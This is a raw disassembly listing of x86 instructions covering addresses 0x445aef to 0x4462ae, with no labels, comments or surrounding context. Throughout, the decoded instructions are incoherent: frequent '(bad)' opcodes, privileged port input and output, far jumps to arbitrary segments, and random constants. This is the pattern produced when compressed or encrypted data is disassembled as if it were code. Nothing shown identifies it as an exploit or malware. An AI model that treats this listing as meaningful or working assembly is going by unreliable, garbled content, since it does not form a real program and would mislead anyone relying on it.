  445aef:	jnp    0x445af9
  445af1:	fst    QWORD PTR [esi-0x5eb99ae5]
  445af7:	in     eax,dx
  445af8:	sub    cl,BYTE PTR [ebx+0x6585f593]
  445afe:	sbb    edi,eax
  445b00:	stos   BYTE PTR es:[edi],al
  445b01:	mov    bl,0x82
  445b03:	fst    QWORD PTR [edx+0x582bbd53]
  445b09:	fnsave [edx-0x3e5ea47c]
  445b0f:	outs   dx,DWORD PTR ds:[esi]
  445b10:	aaa    
  445b11:	or     bh,BYTE PTR [eax-0x50fe6e22]
  445b17:	jmp    0x6ecc2e9d
  445b1c:	imul   esp,DWORD PTR [ecx],0x7b
  445b1f:	test   ecx,ebx
  445b21:	or     bh,BYTE PTR [ebx+edx*8-0x4a]
  445b25:	inc    eax
  445b26:	retf   0xdc40
  445b29:	ror    BYTE PTR [esi-0x15],0x1a
  445b2d:	or     edx,ebx
  445b2f:	inc    ebx
  445b30:	(bad)  
  445b31:	pop    edi
  445b32:	clc    
  445b33:	nop
  445b34:	jno    0x445ad9
  445b36:	jnp    0x445baa
  445b38:	and    BYTE PTR [ecx],0x2b
  445b3b:	std    
  445b3c:	or     ch,BYTE PTR [ebp-0x50]
  445b3f:	fistp  QWORD PTR [esi-0x64]
  445b42:	mov    ah,0xb4
  445b44:	(bad)  
  445b45:	cmp    dh,BYTE PTR [edx-0x56dbf856]
  445b4b:	retf   
  445b4c:	and    DWORD PTR [ebx+0x2a],edx
  445b4f:	jmp    0x3256:0x3acc3801
  445b56:	in     eax,0xf4
  445b58:	call   FWORD PTR ds:0x9c660af7
  445b5e:	imul   ebp,ecx,0xfffffffb
  445b61:	jb     0x445b5d
  445b63:	or     BYTE PTR [ebx-0x49],dl
  445b66:	test   BYTE PTR [ebp+0x72f68cf1],bh
  445b6c:	ss loop 0x445b6b
  445b6f:	add    bh,BYTE PTR [ebx-0x3a]
  445b72:	xchg   ebx,eax
  445b73:	add    ebx,esp
  445b75:	mov    dx,WORD PTR [ecx-0x13e8e69b]
  445b7c:	push   ebp
  445b7d:	cdq    
  445b7e:	xor    al,0x7a
  445b80:	sbb    eax,0xc312d53f
  445b85:	sbb    bh,dl
  445b87:	ja     0x445b3e
  445b89:	hlt    
  445b8a:	stos   DWORD PTR es:[edi],eax
  445b8b:	out    0x1c,al
  445b8d:	adc    edx,ebx
  445b8f:	sbb    DWORD PTR [ecx],esp
  445b91:	jns    0x445b25
  445b93:	xchg   esi,eax
  445b94:	xchg   ebp,eax
  445b95:	pop    ebp
  445b96:	in     al,dx
  445b97:	xor    esi,ebp
  445b99:	jl     0x445bf7
  445b9b:	stos   BYTE PTR es:[edi],al
  445b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445b9d:	mov    ds,ebx
  445b9f:	inc    edi
  445ba0:	xchg   BYTE PTR [edi],ch
  445ba2:	mov    ds:0xa177d3b5,al
  445ba7:	and    BYTE PTR [ecx-0x48],cl
  445baa:	mov    dl,0xfe
  445bac:	xor    DWORD PTR [edi+0xde204be],0xffffffb0
  445bb3:	ret    0xe227
  445bb6:	inc    edi
  445bb7:	rol    BYTE PTR [ecx+0x50f1cfcd],0x96
  445bbe:	xor    BYTE PTR [ecx+0x30],dh
  445bc1:	jl     0x445ba0
  445bc3:	(bad)  
  445bc4:	hlt    
  445bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445bc6:	pop    ds
  445bc7:	cmc    
  445bc8:	std    
  445bc9:	test   al,0x9b
  445bcb:	xchg   esp,eax
  445bcc:	xor    ch,BYTE PTR [edx]
  445bce:	aad    0x1d
  445bd0:	and    edi,DWORD PTR [ecx+ebx*8+0x4f]
  445bd4:	mov    ebx,0x9ec4bfae
  445bd9:	add    ah,BYTE PTR [ebx+0x78]
  445bdc:	test   eax,0xdb7b9816
  445be1:	cdq    
  445be2:	jmp    0x445c29
  445be4:	iret   
  445be5:	das    
  445be6:	mov    bl,0x78
  445be8:	sbb    ecx,ecx
  445bea:	lea    edx,[eax+eiz*4-0x5b]
  445bee:	mov    BYTE PTR [edi],cl
  445bf0:	pop    ebp
  445bf1:	lahf   
  445bf2:	fwait
  445bf3:	push   ebx
  445bf4:	mov    ebp,0x6f571869
  445bf9:	in     eax,0x99
  445bfb:	std    
  445bfc:	in     eax,dx
  445bfd:	ret    
  445bfe:	jmp    0x59e26cf7
  445c03:	push   ds
  445c04:	sbb    cl,bh
  445c06:	pop    ebx
  445c07:	jbe    0x445bf2
  445c09:	xchg   ebp,eax
  445c0a:	sahf   
  445c0b:	mov    cl,0x1b
  445c0d:	inc    esp
  445c0e:	clc    
  445c0f:	jp     0x445c2a
  445c11:	jns    0x445c16
  445c13:	adc    al,0x82
  445c15:	and    al,0x3f
  445c17:	inc    esi
  445c18:	js     0x445bb3
  445c1a:	jmp    0x445c18
  445c1c:	cli    
  445c1d:	mov    dl,ch
  445c1f:	inc    esp
  445c20:	ins    BYTE PTR es:[edi],dx
  445c21:	jp     0x445bb1
  445c23:	push   ebx
  445c24:	add    al,bl
  445c26:	push   ebx
  445c27:	push   0x4d36dcd9
  445c2c:	xchg   ebx,eax
  445c2d:	inc    esi
  445c2e:	shr    eax,0x45
  445c31:	enter  0xeb50,0x9d
  445c35:	lahf   
  445c36:	(bad)
  445c39:	stc    
  445c3a:	jbe    0x445c0c
  445c3c:	lods   eax,DWORD PTR ds:[esi]
  445c3d:	or     eax,0x9cf31aa9
  445c42:	jnp    0x445c19
  445c44:	js     0x445c84
  445c46:	cld    
  445c47:	frstor [eax-0x6b]
  445c4a:	inc    esi
  445c4b:	inc    esp
  445c4c:	push   edi
  445c4d:	rcl    BYTE PTR [esi-0x4b83212c],1
  445c53:	aam    0xd3
  445c55:	aas    
  445c56:	lods   eax,DWORD PTR ds:[esi]
  445c57:	rol    BYTE PTR [ebp-0x2a],cl
  445c5a:	scas   al,BYTE PTR es:[edi]
  445c5b:	icebp  
  445c5c:	jmp    0x445ca8
  445c5e:	mov    al,ds:0x270b0697
  445c63:	gs push cs
  445c65:	mov    BYTE PTR [edx-0x1455cde],0xe6
  445c6c:	fdivp  st(3),st
  445c6e:	sbb    eax,0x4ba25a3c
  445c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445c74:	mov    ds:0x5c1ee162,al
  445c79:	pusha  
  445c7a:	test   ah,dl
  445c7c:	and    edi,DWORD PTR [ebx-0x3286db46]
  445c82:	stos   BYTE PTR es:[edi],al
  445c83:	out    0xf5,eax
  445c85:	test   eax,0x1e65ef9e
  445c8a:	push   ds
  445c8b:	jp     0x445cc3
  445c8d:	retf   0x4528
  445c90:	sbb    BYTE PTR [ecx+0x35c2bbc0],bh
  445c96:	mov    eax,ds:0x5bbef3c4
  445c9b:	out    0x66,eax
  445c9d:	mov    ebp,0xf1a9ca1
  445ca2:	aas    
  445ca3:	ficomp DWORD PTR [esi]
  445ca5:	jns    0x445d01
  445ca7:	mov    al,ds:0xd32bccc0
  445cac:	jmp    0x445c4b
  445cae:	pop    ebx
  445caf:	dec    esp
  445cb0:	hlt    
  445cb1:	mov    ch,0xa
  445cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445cb4:	jne    0x445c6f
  445cb6:	pop    ebp
  445cb7:	push   ebp
  445cb8:	lea    ebp,[ecx]
  445cba:	ja     0x445c98
  445cbc:	pop    esp
  445cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445cbe:	imul   esp,edi,0x65b2f46d
  445cc4:	xchg   ebp,eax
  445cc5:	sbb    ebp,DWORD PTR [eax+esi*8-0x3c2a0ea7]
  445ccc:	fistp  QWORD PTR [ecx]
  445cce:	leave  
  445ccf:	and    al,0xa3
  445cd1:	fist   WORD PTR [ecx+eax*2-0x1606fe0b]
  445cd8:	xchg   ecx,eax
  445cd9:	sbb    ecx,DWORD PTR [ecx]
  445cdb:	fwait
  445cdc:	push   ds
  445cdd:	cmp    DWORD PTR [esi],ecx
  445cdf:	adc    al,0x8f
  445ce1:	outs   dx,BYTE PTR ds:[esi]
  445ce2:	inc    esi
  445ce3:	sub    al,0xc1
  445ce5:	mov    ds:0x3ed115fb,al
  445cea:	mov    dl,BYTE PTR [esp+eiz*2]
  445ced:	dec    ebp
  445cee:	and    BYTE PTR es:[edx-0x7d7b4723],al
  445cf5:	clc    
  445cf6:	gs in  eax,0x35
  445cf9:	cmp    DWORD PTR [ebx+ebp*8-0x6b],edi
  445cfd:	adc    al,0x39
  445cff:	push   ds
  445d00:	sbb    eax,0xe976e989
  445d05:	les    ebx,FWORD PTR [edx-0x5377cca5]
  445d0b:	iret   
  445d0c:	outs   dx,DWORD PTR ds:[esi]
  445d0d:	mov    ch,0xa1
  445d0f:	loope  0x445cce
  445d11:	enter  0x36bd,0x1b
  445d15:	jns    0x445d84
  445d17:	sub    bh,BYTE PTR [edi+0x3e]
  445d1a:	pop    es
  445d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445d1c:	jge    0x445cb9
  445d1e:	jnp    0x445ce0
  445d20:	popf   
  445d21:	shr    DWORD PTR [eax-0x71],0x9e
  445d25:	pop    ss
  445d26:	push   eax
  445d27:	and    eax,0x14bfdab8
  445d2c:	ja     0x445cb3
  445d2e:	sbb    bh,ch
  445d30:	data16 cld 
  445d32:	or     bl,BYTE PTR [edx-0x51]
  445d35:	test   al,0xe5
  445d37:	fldenv [esi]
  445d39:	popa   
  445d3a:	aaa    
  445d3b:	inc    eax
  445d3c:	mov    ah,BYTE PTR [ebp-0xe780b49]
  445d42:	es das 
  445d44:	jne    0x445ce9
  445d46:	sub    ah,dh
  445d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445d49:	and    BYTE PTR [ebx],ch
  445d4b:	daa    
  445d4c:	and    DWORD PTR [eax-0x2e],0xbf4b6b5b
  445d53:	adc    al,0x57
  445d55:	or     bl,BYTE PTR [ebx-0x25c74a98]
  445d5b:	icebp  
  445d5c:	push   ebx
  445d5d:	and    eax,0x3adf1db6
  445d62:	cmp    ah,BYTE PTR [edi+0x1f8fc120]
  445d68:	(bad)  
  445d69:	imul   ebx,DWORD PTR [ecx],0xfffffffa
  445d6c:	inc    ebp
  445d6d:	sub    ebp,DWORD PTR [edi+ebp*8+0x13]
  445d71:	lahf   
  445d72:	sub    esp,DWORD PTR ds:0x9387d079
  445d79:	xchg   ecx,eax
  445d7a:	and    esp,DWORD PTR [ebp-0x7a]
  445d7d:	fwait
  445d7e:	dec    ebx
  445d7f:	push   ds
  445d80:	inc    ecx
  445d81:	icebp  
  445d82:	xchg   ecx,eax
  445d83:	repnz dec edx
  445d85:	ja     0x445d09
  445d87:	inc    ecx
  445d88:	out    0xfa,al
  445d8a:	mov    ch,0x74
  445d8c:	(bad)  
  445d8d:	in     al,dx
  445d8e:	sub    eax,0x83f307ad
  445d93:	mov    dl,0x6d
  445d95:	(bad)  
  445d96:	retf   
  445d97:	repnz fnstcw WORD PTR ds:0x659772fc
  445d9e:	lods   al,BYTE PTR ds:[esi]
  445d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445da0:	inc    edi
  445da1:	and    al,0xba
  445da3:	nop
  445da4:	and    BYTE PTR [esi-0x4ebfeed4],al
  445daa:	lds    esp,FWORD PTR [ecx]
  445dac:	data16 xor al,0xb3
  445daf:	outs   dx,BYTE PTR ds:[esi]
  445db0:	and    ecx,edi
  445db2:	push   edx
  445db3:	xchg   edi,eax
  445db4:	push   cs
  445db5:	add    cl,BYTE PTR [edx+0x7e]
  445db8:	dec    edx
  445db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445dba:	stos   DWORD PTR es:[edi],eax
  445dbb:	mov    BYTE PTR [edi+0x644a2aaf],dh
  445dc1:	test   DWORD PTR [esi],edi
  445dc3:	xchg   edx,eax
  445dc4:	shr    al,0xbd
  445dc7:	xor    al,0x2e
  445dc9:	loopne 0x445d73
  445dcb:	jmp    0x63fb:0xf3ea9605
  445dd2:	mov    ebp,0x80eb1247
  445dd7:	out    dx,eax
  445dd8:	and    ch,cl
  445dda:	xchg   edx,eax
  445ddb:	sub    ecx,esi
  445ddd:	cmp    dl,bl
  445ddf:	outs   dx,DWORD PTR ds:[esi]
  445de0:	ja     0x445e54
  445de2:	fimul  DWORD PTR [esi]
  445de4:	and    eax,0xe0d27979
  445de9:	sub    bl,BYTE PTR [ebx-0x76]
  445dec:	in     eax,0xf0
  445dee:	out    dx,eax
  445def:	out    0x59,eax
  445df1:	gs jmp 0xc72:0xbac922be
  445df9:	lods   eax,DWORD PTR ds:[esi]
  445dfa:	hlt    
  445dfb:	rcl    DWORD PTR [edx+0x21cc0f87],1
  445e01:	imul   esp,DWORD PTR [eax+0x64a4dc33],0x2c891a22
  445e0b:	scas   al,BYTE PTR es:[edi]
  445e0c:	and    BYTE PTR [ebx-0x59438ac6],dh
  445e12:	pusha  
  445e13:	lea    edx,[ebp-0x5c]
  445e16:	mov    ebx,0x442abdd6
  445e1b:	arpl   WORD PTR [edx+0x34],ax
  445e1e:	in     eax,0x6
  445e20:	adc    ch,dh
  445e22:	lods   al,BYTE PTR ds:[esi]
  445e23:	(bad)
  445e26:	xor    dh,BYTE PTR [ebp-0x47430311]
  445e2c:	add    eax,0xda48ec94
  445e31:	hlt    
  445e32:	popa   
  445e33:	imul   edx,esp,0x65
  445e36:	mov    edx,0xb0ba07fe
  445e3b:	sbb    cl,0xd5
  445e3e:	gs pop edx
  445e40:	lock rol DWORD PTR [ebx+esi*2-0x7ffa174c],cl
  445e48:	or     esp,DWORD PTR [edi-0x24b49845]
  445e4e:	mov    es,WORD PTR [esi+edx*2+0x29]
  445e52:	rcl    BYTE PTR [ebx],cl
  445e54:	dec    ebx
  445e55:	cs mov bh,0x44
  445e58:	jge    0x445e94
  445e5a:	add    BYTE PTR [esi],0x65
  445e5d:	add    eax,0xdd19eb9c
  445e62:	pop    esi
  445e63:	neg    DWORD PTR [eax]
  445e65:	mov    DWORD PTR [ebx+0x30701a45],ecx
  445e6b:	aaa    
  445e6c:	imul   esp,DWORD PTR [edx-0x2491cd35],0xffffffea
  445e73:	or     ch,BYTE PTR [edi-0x254e8fc8]
  445e79:	retf   
  445e7a:	mov    ch,0x24
  445e7c:	dec    edx
  445e7d:	ss jne 0x445e9d
  445e80:	in     eax,0xb1
  445e82:	push   ss
  445e83:	repz and al,0x2c
  445e86:	sub    BYTE PTR [ecx],dh
  445e88:	sub    ecx,0xeddd83f1
  445e8e:	push   ebp
  445e8f:	sbb    al,0x86
  445e91:	fst    st(6)
  445e93:	add    DWORD PTR [esi-0x63],edi
  445e96:	retf   0x9300
  445e99:	fcmovnu st,st(4)
  445e9b:	das    
  445e9c:	mov    dl,0xa5
  445e9e:	xor    ecx,DWORD PTR [eax+0x66]
  445ea1:	pop    esp
  445ea2:	les    edi,FWORD PTR [ebx]
  445ea4:	cs cdq 
  445ea6:	sbb    ebx,DWORD PTR [ecx+esi*4+0x2a]
  445eaa:	adc    edi,DWORD PTR [edx+0xb]
  445ead:	xor    eax,0x472e7860
  445eb2:	mov    dh,0x4
  445eb4:	mov    eax,0xf511fdf6
  445eb9:	fild   WORD PTR [edi-0x18]
  445ebc:	mov    ch,0xff
  445ebe:	aaa    
  445ebf:	(bad)  
  445ec0:	and    al,0xd9
  445ec2:	(bad)  
  445ec4:	adc    al,0xfc
  445ec6:	loop   0x445ee8
  445ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445ec9:	xchg   esp,eax
  445eca:	pusha  
  445ecb:	pop    edx
  445ecc:	inc    eax
  445ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445ece:	imul   ebp,DWORD PTR [eax+ebx*4+0x7a],0x2
  445ed3:	add    al,0xac
  445ed5:	or     eax,0xa1265d6d
  445eda:	jnp    0x445ea2
  445edc:	push   ds
  445edd:	test   cl,0x27
  445ee0:	pop    ss
  445ee1:	or     esp,edi
  445ee3:	ret    0xc32
  445ee6:	icebp  
  445ee7:	xor    al,0x3c
  445ee9:	shr    DWORD PTR [ebx+0x57be7307],cl
  445eef:	jmp    0x278c908c
  445ef4:	dec    ebp
  445ef5:	jmp    0x88362218
  445efa:	jnp    0x445ee8
  445efc:	push   ds
  445efd:	je     0x445eea
  445eff:	repz xor eax,0x2ceb8ce8
  445f05:	nop    DWORD PTR [edx+0x2bcb0916]
  445f0c:	and    cl,BYTE PTR [esi-0x5c71e014]
  445f12:	or     edx,DWORD PTR [ebx]
  445f14:	test   DWORD PTR [eax],0x533fd9fe
  445f1a:	fdiv   QWORD PTR [eax]
  445f1c:	loopne 0x445eb6
  445f1e:	ss mov bh,0x78
  445f21:	test   al,0x83
  445f23:	or     BYTE PTR [ebx-0x18448a6f],al
  445f29:	scas   eax,DWORD PTR es:[edi]
  445f2a:	push   edx
  445f2b:	cs retfw 
  445f2e:	std    
  445f2f:	int    0x1c
  445f31:	popf   
  445f32:	ret    
  445f33:	daa    
  445f34:	sub    bh,BYTE PTR [edx+0x4b]
  445f37:	(bad)  
  445f38:	or     ch,bh
  445f3a:	mov    ch,0x34
  445f3c:	jecxz  0x445ed2
  445f3e:	adc    al,0xca
  445f40:	xchg   esi,eax
  445f41:	data16 xor cl,cl
  445f44:	and    esi,DWORD PTR [edi]
  445f46:	mov    DWORD PTR [edx+0x1015cb93],0x1833a228
  445f50:	outs   dx,DWORD PTR ds:[esi]
  445f51:	inc    ebp
  445f52:	xchg   ebp,eax
  445f53:	out    dx,eax
  445f54:	sbb    DWORD PTR [edi+0x15e03a3b],0x4daa942d
  445f5e:	push   ds
  445f5f:	inc    esp
  445f60:	mov    ebx,0xa5e8739d
  445f65:	cmp    ecx,esp
  445f67:	inc    ebx
  445f68:	mov    edx,DWORD PTR [ecx]
  445f6a:	pushf  
  445f6b:	jge    0x445f11
  445f6d:	xchg   ebp,eax
  445f6e:	mov    ebp,0xc60f8d29
  445f73:	jmp    0x43c80c39
  445f78:	addr16 xor eax,0x7831e067
  445f7e:	mov    ebx,0x4c14e51c
  445f83:	jge    0x445f35
  445f85:	push   ds
  445f86:	pop    ecx
  445f87:	and    dh,BYTE PTR [ecx-0x2a]
  445f8a:	pop    eax
  445f8b:	out    dx,al
  445f8c:	sbb    ebx,ecx
  445f8e:	jmp    0x7b3b:0x14b6f604
  445f95:	repz sub esi,DWORD PTR [eax]
  445f98:	enter  0xafa5,0x7f
  445f9c:	ss jno 0x445fcc
  445f9f:	push   esi
  445fa0:	lahf   
  445fa1:	inc    eax
  445fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445fa3:	lock pop es
  445fa5:	push   0xffffffcb
  445fa7:	test   DWORD PTR [edx],0xf7d2c481
  445fad:	or     dl,cl
  445faf:	call   0x259038bf
  445fb4:	(bad)  
  445fb6:	jmp    0xda69072b
  445fbb:	ficom  WORD PTR [ebp+0x36]
  445fbe:	data16 outs dx,BYTE PTR ds:[esi]
  445fc0:	ds and al,0x70
  445fc3:	cli    
  445fc4:	add    eax,0x7df2c2ea
  445fc9:	dec    eax
  445fca:	rcl    DWORD PTR [eax*2+0x5deb6caa],cl
  445fd1:	lahf   
  445fd2:	outs   dx,BYTE PTR ds:[esi]
  445fd3:	jl     0xb6209052
  445fd9:	xor    al,0x99
  445fdb:	mov    ebx,0xc9bdd073
  445fe0:	push   esi
  445fe1:	or     bl,dh
  445fe3:	pop    ss
  445fe4:	cwde   
  445fe5:	xchg   esi,eax
  445fe6:	xor    edx,DWORD PTR [ebx+eax*2-0x4b]
  445fea:	xor    esp,DWORD PTR [edx-0x5b4447cc]
  445ff0:	push   edi
  445ff1:	mov    ecx,DWORD PTR [ebx+0x6c385677]
  445ff7:	sub    eax,0x56339dc3
  445ffc:	jno    0x445fd5
  445ffe:	popa   
  445fff:	ss and al,0x99
  446002:	sar    DWORD PTR [ebx-0x45],cl
  446005:	adc    eax,0xc9a2387c
  44600a:	cmp    ebx,eax
  44600c:	cmc    
  44600d:	cs xchg ebp,esi
  446010:	cdq    
  446011:	les    edx,FWORD PTR [ebx+ecx*2-0x74]
  446015:	(bad)  [ecx+0x7f]
  446018:	cmp    ecx,0x277fc60d
  44601e:	mov    ch,0xba
  446020:	aad    0x4a
  446022:	push   esp
  446023:	repnz repnz mov ebp,DWORD PTR [edi+0x12f7d7a1]
  44602b:	cmp    BYTE PTR [edx+0x5af4c79b],al
  446031:	into   
  446032:	adc    al,BYTE PTR [ecx+0x6]
  446035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446036:	inc    edi
  446037:	push   esp
  446038:	pusha  
  446039:	mov    esp,edi
  44603b:	add    cl,BYTE PTR [esi]
  44603d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44603e:	adc    ebx,DWORD PTR [ebx]
  446040:	adc    eax,0xe1f47542
  446045:	dec    ecx
  446046:	imul   eax,DWORD PTR [esi-0x4b4262d3],0x6
  44604d:	inc    ebx
  44604e:	mov    ah,0x5b
  446050:	xchg   ebp,eax
  446051:	ss clc 
  446053:	in     al,dx
  446054:	lods   eax,DWORD PTR ds:[esi]
  446055:	(bad)  
  446056:	lock jno 0x446072
  446059:	mov    DWORD PTR [esi+0x48b37550],esp
  44605f:	arpl   bx,bp
  446061:	lahf   
  446062:	jmp    0x4460a0
  446064:	sbb    esp,ebp
  446066:	adc    ecx,edi
  446068:	mov    eax,eax
  44606a:	loop   0x44609d
  44606c:	and    DWORD PTR [ecx],ebp
  44606e:	adc    ah,cl
  446070:	adc    eax,0x7bd7a077
  446075:	lahf   
  446076:	fwait
  446077:	test   eax,0x5fbfaa73
  44607c:	scas   eax,DWORD PTR es:[edi]
  44607d:	jns    0x44606b
  44607f:	sahf   
  446080:	and    bl,cl
  446082:	int3   
  446083:	stos   DWORD PTR es:[edi],eax
  446084:	push   edi
  446085:	inc    edi
  446086:	xchg   edi,eax
  446087:	or     bh,BYTE PTR [edx+ebx*4+0x2b]
  44608b:	ins    DWORD PTR es:[edi],dx
  44608c:	(bad)  
  44608d:	stc    
  44608e:	push   edi
  44608f:	jl     0x446018
  446091:	test   DWORD PTR [edi+0x58],esp
  446094:	(bad)
  446097:	push   esp
  446098:	daa    
  446099:	out    dx,al
  44609a:	addr16 or al,0x85
  44609d:	add    BYTE PTR [ebx-0x66877f15],al
  4460a3:	and    BYTE PTR ds:0xf43e5939,0xae
  4460aa:	stos   DWORD PTR es:[edi],eax
  4460ab:	push   ss
  4460ac:	inc    ebp
  4460ad:	mov    DWORD PTR [ebp*4-0x3477db0f],ebp
  4460b4:	xor    bl,BYTE PTR [ebp-0x41]
  4460b7:	sub    BYTE PTR [ebx+0x6511c680],dh
  4460bd:	jno    0x446074
  4460bf:	les    eax,FWORD PTR [edx]
  4460c1:	jae    0x4460f3
  4460c3:	mov    ecx,0xe566ebd5
  4460c8:	fidiv  DWORD PTR [edx+ebx*4]
  4460cb:	repnz xchg ecx,eax
  4460cd:	dec    ecx
  4460ce:	and    ecx,ebp
  4460d0:	test   eax,0xebf785d2
  4460d5:	shl    BYTE PTR [edx-0x51e2a8e7],0xad
  4460dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4460dd:	or     eax,0xf8171ea6
  4460e2:	lahf   
  4460e3:	mov    edx,0xfa111924
  4460e8:	dec    ebp
  4460e9:	xchg   ebp,esi
  4460eb:	iret   
  4460ec:	xchg   esi,eax
  4460ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4460ee:	mov    ebx,0x5f0ae3f0
  4460f3:	(bad)  [eax]
  4460f5:	push   ds
  4460f6:	shr    BYTE PTR [ebx-0xb433888],0xce
  4460fd:	stos   DWORD PTR es:[edi],eax
  4460fe:	xchg   esi,eax
  4460ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446100:	in     eax,0x62
  446102:	pusha  
  446103:	out    0x4a,al
  446105:	ret    0xa2dd
  446108:	ins    DWORD PTR es:[edi],dx
  446109:	sbb    BYTE PTR [ebx-0x42d72ebf],0xe4
  446110:	lea    edi,[ebx+0x7e]
  446113:	xor    eax,DWORD PTR ds:0x62484ba4
  446119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44611a:	mov    DWORD PTR fs:[eax],eax
  44611d:	and    eax,0x2332e61c
  446122:	jo     0x44614d
  446124:	add    eax,0x9eebe78e
  446129:	scas   al,BYTE PTR es:[edi]
  44612a:	inc    eax
  44612b:	int3   
  44612c:	or     bh,dl
  44612e:	into   
  44612f:	sub    eax,0x1cd38356
  446134:	and    BYTE PTR [esi],dl
  446136:	and    eax,DWORD PTR [edi]
  446138:	and    ebx,DWORD PTR [ecx]
  44613a:	scas   al,BYTE PTR es:[edi]
  44613b:	rol    BYTE PTR [ebp+0xcc43a75],1
  446141:	test   al,0x9b
  446143:	mov    ss,WORD PTR [ebp+ebp*1-0x5c]
  446147:	imul   esi,esi,0x18d9c608
  44614d:	stc    
  44614e:	pop    eax
  44614f:	mov    bl,0x84
  446151:	push   edx
  446152:	fstp   QWORD PTR [ebp+0x7]
  446155:	sahf   
  446156:	jmp    0x446146
  446158:	ss push 0xf15951ef
  44615e:	or     eax,0xbadc69f9
  446163:	in     al,0xd3
  446165:	(bad)  
  446166:	adc    ebp,ebp
  446168:	leave  
  446169:	mov    ds:0x4443cefd,eax
  44616e:	shl    DWORD PTR [ebp+edi*4+0x35d0f924],0xd9
  446176:	ds xor eax,0x8111a4fd
  44617c:	and    BYTE PTR [ebp-0x58cad874],dl
  446182:	sub    ebp,DWORD PTR [ebp-0x3]
  446185:	test   al,0xb2
  446187:	inc    edi
  446188:	dec    ecx
  446189:	or     eax,0x3fe7c4cd
  44618e:	mov    ecx,0x2c256204
  446193:	xchg   ebp,eax
  446194:	xor    eax,0xd1fdecf1
  446199:	pop    edi
  44619a:	rcl    BYTE PTR gs:0x63c3029d,1
  4461a1:	fucomi st,st(0)
  4461a3:	dec    eax
  4461a4:	popf   
  4461a5:	ins    BYTE PTR es:[edi],dx
  4461a6:	push   ebp
  4461a7:	adc    ch,bh
  4461a9:	popa   
  4461aa:	lock lock pop ebp
  4461ad:	push   esp
  4461ae:	ret    0xf3ed
  4461b1:	mov    eax,ds:0xb3f1cddb
  4461b6:	fisttp QWORD PTR [edx+0x1b]
  4461b9:	xor    edi,DWORD PTR [ebx-0x47ddfc70]
  4461bf:	add    al,0xbb
  4461c1:	ins    BYTE PTR es:[edi],dx
  4461c2:	xor    DWORD PTR [edx],0x5e44e666
  4461c8:	xor    al,0x9b
  4461ca:	les    ecx,FWORD PTR [ecx-0x4bfdb3a9]
  4461d0:	inc    ebp
  4461d1:	mov    ds:0x2ad256a9,eax
  4461d6:	mov    ecx,0xb9c4318
  4461db:	dec    ebp
  4461dc:	lea    ebp,[esi+0x5d39ac68]
  4461e2:	ja     0x44619b
  4461e4:	pop    ds
  4461e5:	jle    0x4461a0
  4461e7:	and    esi,DWORD PTR [edx]
  4461e9:	mov    esi,ebx
  4461eb:	mov    esi,0x95025b3a
  4461f0:	pop    ecx
  4461f1:	pop    ss
  4461f2:	(bad)  
  4461f3:	xchg   ecx,eax
  4461f4:	inc    esp
  4461f5:	mov    edx,0x588587c9
  4461fa:	or     dh,ah
  4461fc:	sbb    eax,0xa58e9d18
  446201:	inc    BYTE PTR [ebx+0xfc425c1]
  446207:	in     eax,0xaf
  446209:	push   ebx
  44620a:	xor    al,0xe9
  44620c:	xchg   esi,eax
  44620d:	xor    cl,BYTE PTR [edi]
  44620f:	fistp  WORD PTR [esi]
  446211:	out    dx,eax
  446212:	cmp    dl,ah
  446214:	push   ecx
  446215:	mov    eax,ds:0x3fa6bc1d
  44621a:	in     eax,dx
  44621b:	fs ins DWORD PTR es:[edi],dx
  44621d:	and    edi,DWORD PTR [eax-0x7463baeb]
  446223:	lea    ebx,[eax-0x10]
  446226:	push   ebx
  446227:	pushf  
  446228:	push   esp
  446229:	ret    
  44622a:	fisttp WORD PTR [ebp-0x33]
  44622d:	push   cs
  44622e:	dec    esp
  44622f:	cmp    BYTE PTR [ebx],ch
  446231:	pop    ecx
  446232:	or     esi,esp
  446234:	test   eax,0xb5b8b32c
  446239:	daa    
  44623a:	cld    
  44623b:	in     al,dx
  44623c:	scas   eax,DWORD PTR es:[edi]
  44623d:	retf   
  44623e:	and    dh,BYTE PTR [eax+0x32]
  446241:	shr    BYTE PTR [edi+edx*8],1
  446244:	sub    eax,DWORD PTR [esi+eiz*8-0x7daac1b0]
  44624b:	gs add eax,0xcaf0e3af
  446251:	and    eax,DWORD PTR gs:[ebp+0xf46c0be]
  446258:	sti    
  446259:	jg     0x446211
  44625b:	inc    esp
  44625c:	out    0x81,eax
  44625e:	fdivr  QWORD PTR [ebp+0x725c79bd]
  446264:	fsqrt  
  446266:	sti    
  446267:	xchg   ebp,eax
  446268:	lahf   
  446269:	imul   esi,DWORD PTR [ecx-0x66750e86],0x100d1ce9
  446273:	push   ecx
  446274:	sbb    bh,BYTE PTR [esi+edi*2]
  446277:	mov    ebp,esi
  446279:	mov    cl,0xe9
  44627b:	jmp    0x3fd28dbd
  446280:	mov    edx,0xf59ba409
  446285:	data16 mov bh,0x6
  446288:	int    0x75
  44628a:	mov    esp,0xeba11ca4
  44628f:	jmp    FWORD PTR [ecx-0x3f]
  446292:	out    dx,al
  446293:	dec    esp
  446294:	neg    BYTE PTR [edx]
  446296:	inc    ebp
  446297:	aas    
  446298:	mov    edi,DWORD PTR [ecx]
  44629a:	push   ecx
  44629b:	test   al,ch
  44629d:	jmp    0x333f47ce
  4462a2:	mov    esp,0x5b75157a
  4462a7:	hlt    
  4462a8:	stos   DWORD PTR es:[edi],eax
  4462a9:	mov    edx,0x78437086
  4462ae:	pop    ds
